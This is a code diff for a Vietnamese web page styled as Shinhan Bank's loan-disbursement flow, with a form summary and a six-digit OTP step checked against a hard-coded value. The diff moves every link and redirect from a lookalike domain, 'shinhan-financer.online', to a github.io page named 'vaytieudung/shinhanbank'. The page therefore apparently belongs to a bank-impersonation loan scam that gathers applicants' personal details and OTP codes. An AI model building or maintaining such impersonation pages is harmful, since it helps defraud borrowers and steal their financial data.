@@ -530,14 +530,14 @@
 
     <nav role="navigation" aria-label="Main Navigation">
         <ul id="nav-menu">
-            <li><a href="https://www.shinhan-financer.online/pages/vi/trang-chu.html">Trang Chủ</a></li>
-            <li><a href="https://www.shinhan-financer.online/pages/vi/gioi-thieu.html">Giới Thiệu</a></li>
-            <li><a href="https://www.shinhan-financer.online/pages/vi/ca-nhan.html">Lợi Ích</a></li>
-            <li><a href="https://www.shinhan-financer.online/pages/vi/lai-suat-tien-gui.html">Giấy Tờ Cần Thiết</a></li>
-            <li><a href="https://www.shinhan-financer.online/pages/vi/Evaluate-conditions.html">Đăng Ký Giải Ngân</a></li>
-            <li><a href="https://www.shinhan-financer.online/pages/vi/step5.html">Xem Kết Quả</a></li>
-            <li><a href="https://www.shinhan-financer.online/pages/vi/dieu-khoan-su-dung.html">Điều Khoản Sử Dụng</a></li>
-            <li><a href="https://www.shinhan-financer.online/pages/vi/support-center.html">Liên Hệ</a></li>
+            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/trang-chu.html">Trang Chủ</a></li>
+            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">Giới Thiệu</a></li>
+            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/ca-nhan.html">Lợi Ích</a></li>
+            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-tien-gui.html">Giấy Tờ Cần Thiết</a></li>
+            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html">Đăng Ký Giải Ngân</a></li>
+            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step5.html">Xem Kết Quả</a></li>
+            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều Khoản Sử Dụng</a></li>
+            <li><a href="https://vaytieudung.github.io/shinhanbank/pages/vi/support-center.html">Liên Hệ</a></li>
         </ul>
     </nav>
 
@@ -664,7 +664,7 @@
                         );
                     }
                     alert('Vui lòng nhập thông tin giải ngân trước.');
-                    window.location.href = 'https://www.shinhan-financer.online/pages/vi/Evaluate-conditions.html';
+                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
                     return;
                 }
                 document.getElementById('summaryName').textContent = formData.fullName || 'N/A';
@@ -681,7 +681,7 @@
             } catch (error) {
                 console.error('Error parsing formData:', error);
                 alert('Lỗi khi tải thông tin giải ngân. Vui lòng thử lại.');
-                window.location.href = 'https://www.shinhan-financer.online/pages/vi/Evaluate-conditions.html';
+                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
             }
             if (typeof window.Inputmask === 'function') {
                 Inputmask({ regex: "\\d{6}" }).mask(document.getElementById('otp'));
@@ -799,7 +799,7 @@
             if (/^\d{6}$/.test(otp) && otp === '123456') { // Simulated correct OTP
                 sessionStorage.removeItem('formData');
                 alert('Giải ngân qua ATM thành công!');
-                window.location.href = 'https://www.shinhan-financer.online/pages/vi/Evaluate-conditions.html';
+                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
             } else {
                 failedAttempts++;
                 document.getElementById('otpError').classList.add('show');
@@ -824,7 +824,7 @@
                     message.textContent = 'Giải ngân không thành công. Vui lòng thử lại sau.';
                     dialog.classList.add('show');
                     setTimeout(() => {
-                        window.location.href = 'https://www.shinhan-financer.online/pages/vi/Evaluate-conditions.html';
+                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
                     }, 3000);
                 }
             }
